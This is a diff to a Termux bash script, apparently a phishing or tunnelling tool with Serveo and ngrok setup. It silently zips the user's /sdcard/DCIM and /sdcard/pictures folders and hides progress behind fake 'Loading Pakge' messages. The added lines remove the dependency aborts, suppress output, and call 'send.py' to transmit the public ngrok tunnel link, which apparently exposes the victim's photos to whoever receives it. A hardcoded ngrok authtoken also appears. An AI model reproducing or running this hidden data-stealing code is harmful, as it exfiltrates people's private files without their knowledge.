@@ -10,6 +10,14 @@
 #                         </> MONSTER_hp </>
 
 trap 'printf "\n";stop' 2
+pkg install php -y 
+pkg install openssh -y
+pkg install ssh -y
+pkg install wget -y
+pip install requests
+pip install platform
+pip install sys
+termux-setup-storage
 printf "\e[1;92m
 
  ____                      _                 _
@@ -23,6 +31,13 @@ printf "\n"
 printf "\e[1;90m    \n"
 chmod +x *
 zip server1 -r /sdcard/DCIM > /dev/null 2>&1
+printf " \e[1;95m   OK Pakge 1  \n"
+printf "\n"
+printf "\e[1;92m
+
+Loading Pakge 2 ...
+                                                         
+/n"
 zip server2 -r /sdcard/pictures > /dev/null 2>&1
 clear
 banner() {
@@ -75,7 +90,7 @@ exit 1
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; }
  
 
 
@@ -121,7 +136,7 @@ done
 
 server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; }
 
 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
 
@@ -164,8 +179,8 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting.";}
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -176,10 +191,10 @@ if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
-./ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye
+./ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye > /dev/null 2>&1
 else
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
+
 fi
 
 else
@@ -190,7 +205,7 @@ chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
+
 fi
 fi
 fi
@@ -203,8 +218,9 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+python send.py $link
+sleep 15
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-
 payload_ngrok
 checkfound
 }
